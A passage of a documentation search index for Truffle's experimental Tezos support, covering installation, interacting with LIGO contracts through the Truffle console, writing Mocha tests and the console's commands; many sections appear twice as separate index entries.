Tezos"},{"location":"docs/tezos/truffle/getting-started/installing-truffle-with-tezos.html#installing-docker","text":"Before you can start developing Tezos applications with Truffle, you'll first need to ensure you have Docker installed on your machine. Installing docker let's Truffle easily use the latest LIGO compiler on any platform. See Docker install instructions for your platform. Docker on Windows: If you're developing on Windows, you need to install the Docker edge release instead of the mainline docker version. Trust us: This is a better experience.","title":"Installing Docker"},{"location":"docs/tezos/truffle/getting-started/installing-truffle-with-tezos.html#other-requirements","text":"NodeJS v8.9.4 or later Windows, Linux or Mac OS X","title":"Other Requirements"},{"location":"docs/tezos/truffle/getting-started/installing-truffle-with-tezos.html#installing-truffle","text":"You'll need to download a special version of Truffle to use Tezos. $ npm install -g truffle@tezos If you already have Truffle installed, we recommend uninstalling truffle before running the above command.","title":"Installing Truffle"},{"location":"docs/tezos/truffle/getting-started/installing-truffle-with-tezos.html#next-step-create-a-truffle-project-with-tezos","text":"Once you have Truffle and Docker installed, you can move on to creating a Tezos project with Truffle.","title":"Next step: Create a Truffle project with Tezos"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Interacting with your contracts \u00b6 Introduction \u00b6 If you were writing raw requests to the Tezos network yourself in order to interact with your contracts, you'd soon realize that writing these requests is clunky and cumbersome. As well, you might find that managing the state for each request you've made is complicated . Fortunately, Truffle takes care of this complexity for you, to make interacting with your contracts a breeze. Making Transactions \u00b6 Every time you call a function against a contract on the Tezos blockchain, a transaction is recorded. Each transaction will cost you XTZ, the Tezos-specific token that powers the blockchain, and will change the blockchain's state. Transactions are powerful ways to \"write\" to the blockchain, and make changes that power the backend of your applications. As you'll see below, all your contract's data stored on chain, colloquially called \"storage\", is read from the blockchain all at once. Introducing abstractions \u00b6 Contract abstractions are the bread and butter of interacting with Tezos contracts from Javascript. In short, contract abstractions are wrapper code that makes interaction with your contracts easy, in a way that lets you forget about the many engines and gears executing under the hood. Truffle uses its own contract abstraction via the @truffle/contract module, extended specifically for Tezos, and it is this contract abstraction that's described below. In order to appreciate the usefulness of a contract abstraction, however, we first need a contract to talk about. We'll use the very simple SimpleStorage contract available to you via truffle unbox tezos-example command. function main (const newValue : int; const storedValue : int) : (list(operation) * int) is block { storedValue := newValue } with ((nil : list(operation)), storedValue) This contract has a single method, or \"entry point\", called main() . You'll notice that the first parameter to main() is an integer that gets stored in the contract's storage. The second parameter represents current state of the contract's storage at time of the function execution. Now let's look at the Javascript object called SimpleStorage provided for us by Truffle, as made available in the Truffle console : truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > instance // outputs: // // Contract // - address: \"KT1AiUNZTnTEbvuSZFcjSEW1V5yB6CW44sHc\" // - main: () // - storage: () // - send: () // ... Notice that the abstraction contains the same function you defined in your contract -- main() . It also contains some helper functions ( storage() and send() ), as well as the address of the contract on-chain. Multi-Entrypoint Contracts \u00b6 As described in the Writing Tezos Contracts section, you can define contracts that have multiple entry points. When you create a contract as defined in that section, Truffle does a lot of work to make interacting with that contract easier. Let's take a look: // variant defining pseudo multi-entrypoint actions type action is | Increment of int | Decrement of int function add (const a : int ; const b : int) : int is a + b function subtract (const a : int ; const b : int) : int is a - b // real entrypoint that re-routes the flow based on the action provided function main (const p : action ; const s : int) : (list(operation) * int) is ((nil : list(operation)), case p of | Increment (n) -> add (s, n) | Decrement (n) -> subtract (s, n) end) If you compile this contract and spin up the console, you'll see the following when you analyze the abstraction Truffle creates for you: truffle ( development ) > let instance = await Counter . deployed () truffle ( development ) > instance // outputs: // // Contract // - address: \"KT19mnZBa9KCtfv1t47gz9ieKyoxhY8JUvy8\" // - increment: () // - decrement: () // - storage: () // - send: () // ... In this example, you'll notice a curious change: main() has been removed, and has been replaced by increment() and decrement() , which were two functions created by Truffle to make it easy to call the entry points defined in your contract. Executing contract functions \u00b6 Whenever you call contract functions via the abstraction, say main() , increment() or decrement() in the above examples, a transaction request is made against the configured Tezos network. Calling these functions from Javascript will create a transaction on the Tezos blockchain, and make a state change on the blockchain itself. You should consider these functions as \"writes\", where executing these functions write data to the blockchain. To perform \"reads\", and read storage data, you'll use the storage() helper function described below. Making a transaction \u00b6 Making a transaction is as easy as calling the abstraction functions Truffle provides for you. To make things easy, let's start with the SimpleStorage contract defined above. Like before, let's get the deployed instance of it, but let's also call the main() function to send the transaction, and then once complete, request the contract's storage data: truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . main ( 2 ) // Make transaction against main() function { tx : 'op8HbSFaHACRQrVZT7SmHjpRwqa9fDVxb6Zjwcyj57jwEgzKpcd' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } There are a few things interesting about the above code: We called the abstraction's main() function directly. When calling the main() function, we only passed on parameter. The second (last) parameter of the main() function is provided by the underlying blockchain, and represents the current storage data of the contract. Because it's sent to the contract for us, we don't need to send it from the outside. We received a transaction response after calling main() , which included a transaction hash (the tx parameter in the response). The transaction hash describe the id of the transaction on the blockchain. We used the helper function, storage() , to get the storage data of the contract. The data of this particular contract is an integer, and in Javascript is represented by the BigNumber object, in this case with the value of 2 . This happens to be the value we sent to main() within our transaction! This is all well and good. Now let's try it with a multi-entrypoint contract: truffle ( development ) > let instance = await Counter . deployed () truffle ( development ) > await instance . increment ( 2 ) // Make transaction against increment() entry point { tx : 'onsbwiB8HK9heBmcJAHRvadcH435waNPpKAMMMGLsiEYXRhtqhx' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 3 ] } This is very similar to the example above, except in this case we didn't call main() . We instead called one of the named entry points, increment() , and it was treated as a transaction, exactly as if we had called main() . Reading contract data \u00b6 As shown into the examples above, we can read the contract's data through the storage() function: truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } What's interesting here: We received a return value. Note that since the Ethereum network can handle very large numbers, we're given a BigNumber object which we can then convert to a number. The BigNumber library is used because Tezos can represent larger numbers than are allowed natively by Javascript. Warning : If you try to convert a BigNumber that's larger than the largest integer supported by Javascript, you'll likely run into errors or unexpected behavior. We suggest using BigNumber throughout your application. Note that the data you get back from the storage() function will represent the types and structure of the underlying data stored in your contract. Let's take a new example we haven't seen yet: // ExpandedStorage.ligo - much like SimpleStorage, but stores two values! type values is record firstValue : int; secondValue : int; end function main (const newValues : values; const storedValues : values) : (list(operation) * values) is block { storedValues := newValues } with ((nil : list(operation)), storedValues) In this contract, the contract's storage is represented by a LIGO record object that contains two integers, the first named firstValue , and the second named secondValue . When you call storage() from the Truffle console, you'll see you're given data that respresents the same structure: truffle ( development ) > let instance = await ExpandedStorage . deployed () truffle ( development ) > await instance . storage () // Get storage data { firstValue : BigNumber { s : 1 , e : 0 , c : [ 3 ] }, secondValue : BigNumber { s : 1 , e : 0 , c : [ 3 ] } } Add a new contract to the network \u00b6 In the above cases, we've been using a contract abstraction that has already been deployed through Truffle's deployment system. You can deploy new contracts to the network within your own code by using .new() function provided by the top-level abstraction object: truffle ( developmnet ) > let newInstance = await SimpleStorage . new ( 3 ) // Deploy a new version of SimpleStorage truffle ( development ) > newInstance . address 'KT1Rt8CozyFb1HFhdkK7BLEcURsCtMxCYs1b' truffle ( development ) > await newInstance . storage () BigNumber { s : 1 , e : 0 , c : [ 3 ] } Use a contract at a specific address \u00b6 If you already have an address for a contract stored externally, you can create a new abstraction to represent the contract at that address, using the at() function provided by the top-level abstraction object: truffle ( development ) > let specificInstance = await SimpleStorage . at ( \"KT1Rt8CozyFb1HFhdkK7BLEcURsCtMxCYs1b\" ); truffle ( development ) > await newInstance . storage () BigNumber { s : 1 , e : 0 , c : [ 3 ] } Further reading \u00b6 The contract abstractions provided by Truffle wouldn't have been possible without the amazing Taquito library that does a lot of the heavy lifing for what you see above. Check out their documentation for more information.","title":"Truffle | Interacting with Your Contracts"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#interacting-with-your-contracts","text":"","title":"Interacting with your contracts"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#introduction","text":"If you were writing raw requests to the Tezos network yourself in order to interact with your contracts, you'd soon realize that writing these requests is clunky and cumbersome. As well, you might find that managing the state for each request you've made is complicated . Fortunately, Truffle takes care of this complexity for you, to make interacting with your contracts a breeze.","title":"Introduction"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#making-transactions","text":"Every time you call a function against a contract on the Tezos blockchain, a transaction is recorded. Each transaction will cost you XTZ, the Tezos-specific token that powers the blockchain, and will change the blockchain's state. Transactions are powerful ways to \"write\" to the blockchain, and make changes that power the backend of your applications. As you'll see below, all your contract's data stored on chain, colloquially called \"storage\", is read from the blockchain all at once.","title":"Making Transactions"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#introducing-abstractions","text":"Contract abstractions are the bread and butter of interacting with Tezos contracts from Javascript. In short, contract abstractions are wrapper code that makes interaction with your contracts easy, in a way that lets you forget about the many engines and gears executing under the hood. Truffle uses its own contract abstraction via the @truffle/contract module, extended specifically for Tezos, and it is this contract abstraction that's described below. In order to appreciate the usefulness of a contract abstraction, however, we first need a contract to talk about. We'll use the very simple SimpleStorage contract available to you via truffle unbox tezos-example command. function main (const newValue : int; const storedValue : int) : (list(operation) * int) is block { storedValue := newValue } with ((nil : list(operation)), storedValue) This contract has a single method, or \"entry point\", called main() . You'll notice that the first parameter to main() is an integer that gets stored in the contract's storage. The second parameter represents current state of the contract's storage at time of the function execution. Now let's look at the Javascript object called SimpleStorage provided for us by Truffle, as made available in the Truffle console : truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > instance // outputs: // // Contract // - address: \"KT1AiUNZTnTEbvuSZFcjSEW1V5yB6CW44sHc\" // - main: () // - storage: () // - send: () // ... Notice that the abstraction contains the same function you defined in your contract -- main() . It also contains some helper functions ( storage() and send() ), as well as the address of the contract on-chain.","title":"Introducing abstractions"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#multi-entrypoint-contracts","text":"As described in the Writing Tezos Contracts section, you can define contracts that have multiple entry points. When you create a contract as defined in that section, Truffle does a lot of work to make interacting with that contract easier. Let's take a look: // variant defining pseudo multi-entrypoint actions type action is | Increment of int | Decrement of int function add (const a : int ; const b : int) : int is a + b function subtract (const a : int ; const b : int) : int is a - b // real entrypoint that re-routes the flow based on the action provided function main (const p : action ; const s : int) : (list(operation) * int) is ((nil : list(operation)), case p of | Increment (n) -> add (s, n) | Decrement (n) -> subtract (s, n) end) If you compile this contract and spin up the console, you'll see the following when you analyze the abstraction Truffle creates for you: truffle ( development ) > let instance = await Counter . deployed () truffle ( development ) > instance // outputs: // // Contract // - address: \"KT19mnZBa9KCtfv1t47gz9ieKyoxhY8JUvy8\" // - increment: () // - decrement: () // - storage: () // - send: () // ... In this example, you'll notice a curious change: main() has been removed, and has been replaced by increment() and decrement() , which were two functions created by Truffle to make it easy to call the entry points defined in your contract.","title":"Multi-Entrypoint Contracts"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#executing-contract-functions","text":"Whenever you call contract functions via the abstraction, say main() , increment() or decrement() in the above examples, a transaction request is made against the configured Tezos network. Calling these functions from Javascript will create a transaction on the Tezos blockchain, and make a state change on the blockchain itself. You should consider these functions as \"writes\", where executing these functions write data to the blockchain. To perform \"reads\", and read storage data, you'll use the storage() helper function described below.","title":"Executing contract functions"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#making-a-transaction","text":"Making a transaction is as easy as calling the abstraction functions Truffle provides for you. To make things easy, let's start with the SimpleStorage contract defined above. Like before, let's get the deployed instance of it, but let's also call the main() function to send the transaction, and then once complete, request the contract's storage data: truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . main ( 2 ) // Make transaction against main() function { tx : 'op8HbSFaHACRQrVZT7SmHjpRwqa9fDVxb6Zjwcyj57jwEgzKpcd' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } There are a few things interesting about the above code: We called the abstraction's main() function directly. When calling the main() function, we only passed on parameter. The second (last) parameter of the main() function is provided by the underlying blockchain, and represents the current storage data of the contract. Because it's sent to the contract for us, we don't need to send it from the outside. We received a transaction response after calling main() , which included a transaction hash (the tx parameter in the response). The transaction hash describe the id of the transaction on the blockchain. We used the helper function, storage() , to get the storage data of the contract. The data of this particular contract is an integer, and in Javascript is represented by the BigNumber object, in this case with the value of 2 . This happens to be the value we sent to main() within our transaction! This is all well and good. Now let's try it with a multi-entrypoint contract: truffle ( development ) > let instance = await Counter . deployed () truffle ( development ) > await instance . increment ( 2 ) // Make transaction against increment() entry point { tx : 'onsbwiB8HK9heBmcJAHRvadcH435waNPpKAMMMGLsiEYXRhtqhx' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 3 ] } This is very similar to the example above, except in this case we didn't call main() . We instead called one of the named entry points, increment() , and it was treated as a transaction, exactly as if we had called main() .","title":"Making a transaction"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#reading-contract-data","text":"As shown into the examples above, we can read the contract's data through the storage() function: truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } What's interesting here: We received a return value. Note that since the Ethereum network can handle very large numbers, we're given a BigNumber object which we can then convert to a number. The BigNumber library is used because Tezos can represent larger numbers than are allowed natively by Javascript. Warning : If you try to convert a BigNumber that's larger than the largest integer supported by Javascript, you'll likely run into errors or unexpected behavior. We suggest using BigNumber throughout your application. Note that the data you get back from the storage() function will represent the types and structure of the underlying data stored in your contract. Let's take a new example we haven't seen yet: // ExpandedStorage.ligo - much like SimpleStorage, but stores two values! type values is record firstValue : int; secondValue : int; end function main (const newValues : values; const storedValues : values) : (list(operation) * values) is block { storedValues := newValues } with ((nil : list(operation)), storedValues) In this contract, the contract's storage is represented by a LIGO record object that contains two integers, the first named firstValue , and the second named secondValue . When you call storage() from the Truffle console, you'll see you're given data that respresents the same structure: truffle ( development ) > let instance = await ExpandedStorage . deployed () truffle ( development ) > await instance . storage () // Get storage data { firstValue : BigNumber { s : 1 , e : 0 , c : [ 3 ] }, secondValue : BigNumber { s : 1 , e : 0 , c : [ 3 ] } }","title":"Reading contract data"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#add-a-new-contract-to-the-network","text":"In the above cases, we've been using a contract abstraction that has already been deployed through Truffle's deployment system. You can deploy new contracts to the network within your own code by using .new() function provided by the top-level abstraction object: truffle ( developmnet ) > let newInstance = await SimpleStorage . new ( 3 ) // Deploy a new version of SimpleStorage truffle ( development ) > newInstance . address 'KT1Rt8CozyFb1HFhdkK7BLEcURsCtMxCYs1b' truffle ( development ) > await newInstance . storage () BigNumber { s : 1 , e : 0 , c : [ 3 ] }","title":"Add a new contract to the network"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#use-a-contract-at-a-specific-address","text":"If you already have an address for a contract stored externally, you can create a new abstraction to represent the contract at that address, using the at() function provided by the top-level abstraction object: truffle ( development ) > let specificInstance = await SimpleStorage . at ( \"KT1Rt8CozyFb1HFhdkK7BLEcURsCtMxCYs1b\" ); truffle ( development ) > await newInstance . storage () BigNumber { s : 1 , e : 0 , c : [ 3 ] }","title":"Use a contract at a specific address"},{"location":"docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts.html#further-reading","text":"The contract abstractions provided by Truffle wouldn't have been possible without the amazing Taquito library that does a lot of the heavy lifing for what you see above. Check out their documentation for more information.","title":"Further reading"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Testing Your Tezos Contracts \u00b6 Framework \u00b6 Truffle comes standard with an automated testing framework to make testing your contracts a breeze. This framework lets you write simple and manageable tests from Javascript and Typescript. Location \u00b6 All test files should be located in the ./test directory. Truffle will only run test files with the following file extensions: .js , .ts , .es , .es6 , and .jsx . All other files are ignored. Command \u00b6 To run all tests, simply run: $ truffle test Alternatively, you can specify a path to a specific file you want to run, e.g., $ truffle test ./path/to/test/file.js Clean-room environment \u00b6 Truffle provides a clean room environment when running your test files. When running your tests, Truffle will re-deploy all of your migrations at the beginning of every test file to ensure you have a fresh set of contracts to test against. Speed and reliability considerations \u00b6 The above clean room environment is a trade off between speed and test maintainability, but at times can be slow. We originally built Ganache for Ethereum to make running Ethereum-based tests significantly faster, where the test framework can take advantage of testing-specific features. We hope to do the same for Tezos. Please reach out to TQ and let them know you'd like a version of Ganache for Tezos! Writing Tests in JavaScript \u00b6 Truffle uses the Mocha testing framework and Chai for assertions to provide you with a solid framework from which to write your JavaScript tests. Let's dive in and see how Truffle builds on top of Mocha to make testing your contracts a breeze. Note: If you're unfamiliar with writing unit tests in Mocha, please see Mocha's documentation before continuing. Use contract() instead of describe() \u00b6 Structurally, your tests should remain largely unchanged from that of Mocha: Your tests should exist in the ./test directory, they should end with a .js extension (generally), and they should contain code that Mocha will recognize as an automated test. What makes Truffle tests different from that of Mocha is the contract() function: This function works exactly like describe() except it enables Truffle's clean-room features described above. It works like this: Before each contract() function is run, your contracts are redeployed to the running Tezos client so the tests within it run with a clean contract state. The contract() function provides a list of accounts made available by your Tezos client which you can use to write tests. Since Truffle uses Mocha under the hood, you can still use describe() to run normal Mocha tests whenever Truffle clean-room features are not required. Use contract abstractions within your tests \u00b6 Contract abstractions are the basis for making contract interaction possible from JavaScript (they're basically our flux capacitor ). Because Truffle has no way of detecting which contracts you'll need to interact with within your tests, you'll need to ask for those contracts explicitly. You do this by using the artifacts.require() method, a method provided by Truffle that allows you to request a usable contract abstraction for a specific Tezos contract. As you'll see in the example below, you can then use this abstraction to make sure your contracts are working properly. For more information on using contract abstractions, see the Interacting With Your Contracts section. Using artifacts.require() \u00b6 Using artifacts.require() within your tests works the same way as using it within your migrations; you just need to pass the name of the contract. See the artifacts.require() documentation in the Migrations section for detailed usage. Using the Tezos object \u00b6 A Tezos object is available in each test file, provided by the Taquito interaction library . You can find an example of its usage here . You'll want to use this object for interactions with Tezos clients that aren't included by default within Truffle's contract abstraction. Examples \u00b6 Using .then \u00b6 Here's an example test provided in the Tezos Truffle Box . Note the use of the contract() function and our use of artifacts.require() for interacting directly with our contracts. File: ./test/simpleStorage.test.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); contract ( 'SimpleStorage' , () => { it ( \"...should store the integer 89.\" , ( done ) => { var simpleStorageInstance ; SimpleStorage . deployed (). then ( function ( instance ) { simpleStorageInstance = instance ; return simpleStorageInstance . main ( 89 ); }). then ( function ( tx ) { return simpleStorageInstance . storage (); }). then ( function ( storedInt ) { assert . equal ( storedInt , 89 , \"The integer 89 was not stored.\" ); }); }); }); This test will produce the following output: Contract: SimpleStorage \u221a ...should store the integer 89 (283ms) 1 passing (283ms) Using async/await \u00b6 Here is a similar example, but using async/await notation. As you'll notice, this syntax is much more straightforward. const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); contract ( 'SimpleStorage' , () => { it ( \"...should store the integer 89.\" , async () => { const simpleStorageInstance = await SimpleStorage . deployed () await simpleStorageInstance . main ( 89 ); const storedInt = await simpleStorageInstance . storage (); assert . equal ( storedInt , 89 , \"The integer 89 was not stored.\" ); }); }); This test will produce identical output to the previous example. Specifying tests \u00b6 You can limit the tests being executed to a specific file as follows: truffle test ./test/simpleStorage.js See the full command reference for more information. Advanced \u00b6 Truffle gives you access to Mocha's configuration so you can change how Mocha behaves. See the project configuration section for more details.","title":"Truffle | Testing Your Tezos Contracts"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#testing-your-tezos-contracts","text":"","title":"Testing Your Tezos Contracts"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#framework","text":"Truffle comes standard with an automated testing framework to make testing your contracts a breeze. This framework lets you write simple and manageable tests from Javascript and Typescript.","title":"Framework"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#location","text":"All test files should be located in the ./test directory. Truffle will only run test files with the following file extensions: .js , .ts , .es , .es6 , and .jsx . All other files are ignored.","title":"Location"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#command","text":"To run all tests, simply run: $ truffle test Alternatively, you can specify a path to a specific file you want to run, e.g., $ truffle test ./path/to/test/file.js","title":"Command"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#clean-room-environment","text":"Truffle provides a clean room environment when running your test files. When running your tests, Truffle will re-deploy all of your migrations at the beginning of every test file to ensure you have a fresh set of contracts to test against.","title":"Clean-room environment"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#speed-and-reliability-considerations","text":"The above clean room environment is a trade off between speed and test maintainability, but at times can be slow. We originally built Ganache for Ethereum to make running Ethereum-based tests significantly faster, where the test framework can take advantage of testing-specific features. We hope to do the same for Tezos. Please reach out to TQ and let them know you'd like a version of Ganache for Tezos!","title":"Speed and reliability considerations"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#writing-tests-in-javascript","text":"Truffle uses the Mocha testing framework and Chai for assertions to provide you with a solid framework from which to write your JavaScript tests. Let's dive in and see how Truffle builds on top of Mocha to make testing your contracts a breeze. Note: If you're unfamiliar with writing unit tests in Mocha, please see Mocha's documentation before continuing.","title":"Writing Tests in JavaScript"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#use-contract-instead-of-describe","text":"Structurally, your tests should remain largely unchanged from that of Mocha: Your tests should exist in the ./test directory, they should end with a .js extension (generally), and they should contain code that Mocha will recognize as an automated test. What makes Truffle tests different from that of Mocha is the contract() function: This function works exactly like describe() except it enables Truffle's clean-room features described above. It works like this: Before each contract() function is run, your contracts are redeployed to the running Tezos client so the tests within it run with a clean contract state. The contract() function provides a list of accounts made available by your Tezos client which you can use to write tests. Since Truffle uses Mocha under the hood, you can still use describe() to run normal Mocha tests whenever Truffle clean-room features are not required.","title":"Use contract() instead of describe()"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#use-contract-abstractions-within-your-tests","text":"Contract abstractions are the basis for making contract interaction possible from JavaScript (they're basically our flux capacitor ). Because Truffle has no way of detecting which contracts you'll need to interact with within your tests, you'll need to ask for those contracts explicitly. You do this by using the artifacts.require() method, a method provided by Truffle that allows you to request a usable contract abstraction for a specific Tezos contract. As you'll see in the example below, you can then use this abstraction to make sure your contracts are working properly. For more information on using contract abstractions, see the Interacting With Your Contracts section.","title":"Use contract abstractions within your tests"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#using-artifactsrequire","text":"Using artifacts.require() within your tests works the same way as using it within your migrations; you just need to pass the name of the contract. See the artifacts.require() documentation in the Migrations section for detailed usage.","title":"Using artifacts.require()"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#using-the-tezos-object","text":"A Tezos object is available in each test file, provided by the Taquito interaction library . You can find an example of its usage here . You'll want to use this object for interactions with Tezos clients that aren't included by default within Truffle's contract abstraction.","title":"Using the Tezos object"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#examples","text":"","title":"Examples"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#using-then","text":"Here's an example test provided in the Tezos Truffle Box . Note the use of the contract() function and our use of artifacts.require() for interacting directly with our contracts. File: ./test/simpleStorage.test.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); contract ( 'SimpleStorage' , () => { it ( \"...should store the integer 89.\" , ( done ) => { var simpleStorageInstance ; SimpleStorage . deployed (). then ( function ( instance ) { simpleStorageInstance = instance ; return simpleStorageInstance . main ( 89 ); }). then ( function ( tx ) { return simpleStorageInstance . storage (); }). then ( function ( storedInt ) { assert . equal ( storedInt , 89 , \"The integer 89 was not stored.\" ); }); }); }); This test will produce the following output: Contract: SimpleStorage \u221a ...should store the integer 89 (283ms) 1 passing (283ms)","title":"Using .then"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#using-asyncawait","text":"Here is a similar example, but using async/await notation. As you'll notice, this syntax is much more straightforward. const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); contract ( 'SimpleStorage' , () => { it ( \"...should store the integer 89.\" , async () => { const simpleStorageInstance = await SimpleStorage . deployed () await simpleStorageInstance . main ( 89 ); const storedInt = await simpleStorageInstance . storage (); assert . equal ( storedInt , 89 , \"The integer 89 was not stored.\" ); }); }); This test will produce identical output to the previous example.","title":"Using async/await"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#specifying-tests","text":"You can limit the tests being executed to a specific file as follows: truffle test ./test/simpleStorage.js See the full command reference for more information.","title":"Specifying tests"},{"location":"docs/tezos/truffle/getting-started/testing-your-tezos-contracts.html#advanced","text":"Truffle gives you access to Mocha's configuration so you can change how Mocha behaves. See the project configuration section for more details.","title":"Advanced"},{"location":"docs/tezos/truffle/getting-started/using-the-console-with-tezos.html","text":"Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Using the Truffle Console with Tezos \u00b6 Sometimes it's nice to work with your contracts interactively for testing and debugging purposes, or for executing transactions by hand. Truffle provides you an easy way to do this via an interactive console, with your contracts available and ready to use. Command \u00b6 To launch the console, run the following from your project folder: truffle console Truffle will immediately look for a network definition called development in the configuration, and connect to it, if available. You can override this using the --network <name> option or customize the development network settings. See more details in the Networks section as well as the command reference . When you load the console, you'll immediately see the following prompt: truffle ( development ) > This tells you you're running within a Truffle console using the development network. Features \u00b6 The Truffle console provides most of the features available in the Truffle command line tool. For instance, you can type migrate --reset within the console, and it will be interpreted the same as if you ran truffle migrate --reset on the command line from within your Truffle project. Additionally, the console has the following features: All of your compiled contracts are available and ready for use, via objects like SimpleStorage , which are given the same names as your contracts. After each command (such as migrate --reset ) your contracts are reprovisioned so you can start using the newly assigned addresses and binaries immediately. Example \u00b6 Here's an example using the SimpleStorage contract that comes with the tezos-example Truffle box. In this example, we first run the deploy command, which deploys our contracts to the configured network (equivalent to running truffle deploy from the shell). We then use the supplied contract abstraction to get an object that represents the deployed SimpleStorage contract; call its main() function, creating a new transaction; and then get the contract's data after the transaction completed successfully. truffle ( development ) > deploy 1 _deploy_simple_storage . js ========================== Deploying 'SimpleStorage' ------------------------- > operation hash : opNAUau1XwLzhLJud4XmabRppE81QkZaWm2EcUNeMsxjN2qnRDf > Blocks : 1 Seconds : 24 ... // truncated output truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . main ( 2 ) // Make transaction against main() function { tx : 'op8HbSFaHACRQrVZT7SmHjpRwqa9fDVxb6Zjwcyj57jwEgzKpcd' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } For more information using the contract abstractions made available in the console, see the Interacting With Your Tezos Contracts section. Commands available \u00b6 You can run the following commands from within the console: build compile create debug deploy exec help install migrate networks opcode publish run test version If a Truffle command is not available, it is because it is not relevant for an existing project (for example, init ) wouldn't make sense (for example, develop or console ). See full command reference for more information.","title":"Truffle | Using Truffle Console | Tezos"},{"location":"docs/tezos/truffle/getting-started/using-the-console-with-tezos.html#using-the-truffle-console-with-tezos","text":"Sometimes it's nice to work with your contracts interactively for testing and debugging purposes, or for executing transactions by hand. Truffle provides you an easy way to do this via an interactive console, with your contracts available and ready to use.","title":"Using the Truffle Console with Tezos"},{"location":"docs/tezos/truffle/getting-started/using-the-console-with-tezos.html#command","text":"To launch the console, run the following from your project folder: truffle console Truffle will immediately look for a network definition called development in the configuration, and connect to it, if available. You can override this using the --network <name> option or customize the development network settings. See more details in the Networks section as well as the command reference . When you load the console, you'll immediately see the following prompt: truffle ( development ) > This tells you you're running within a Truffle console using the development network.","title":"Command"},{"location":"docs/tezos/truffle/getting-started/using-the-console-with-tezos.html#features","text":"The Truffle console provides most of the features available in the Truffle command line tool. For instance, you can type migrate --reset within the console, and it will be interpreted the same as if you ran truffle migrate --reset on the command line from within your Truffle project. Additionally, the console has the following features: All of your compiled contracts are available and ready for use, via objects like SimpleStorage , which are given the same names as your contracts. After each command (such as migrate --reset ) your contracts are reprovisioned so you can start using the newly assigned addresses and binaries immediately.","title":"Features"},{"location":"docs/tezos/truffle/getting-started/using-the-console-with-tezos.html#example","text":"Here's an example using the SimpleStorage contract that comes with the tezos-example Truffle box. In this example, we first run the deploy command, which deploys our contracts to the configured network (equivalent to running truffle deploy from the shell). We then use the supplied contract abstraction to get an object that represents the deployed SimpleStorage contract; call its main() function, creating a new transaction; and then get the contract's data after the transaction completed successfully. truffle ( development ) > deploy 1 _deploy_simple_storage . js ========================== Deploying 'SimpleStorage' ------------------------- > operation hash : opNAUau1XwLzhLJud4XmabRppE81QkZaWm2EcUNeMsxjN2qnRDf > Blocks : 1 Seconds : 24 ... // truncated output truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . main ( 2 ) // Make transaction against main() function { tx : 'op8HbSFaHACRQrVZT7SmHjpRwqa9fDVxb6Zjwcyj57jwEgzKpcd' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } For more information using the contract abstractions made available in the console, see the Interacting With Your Tezos Contracts section.","title":"Example"},{"location":"docs/tezos/truffle/getting-started/using-the-console-with-tezos.html#commands-available","text":"You can run the following commands from within the console: build compile create debug deploy exec help install migrate networks opcode publish run test version If a Truffle command is not available, it is because it is not relevant 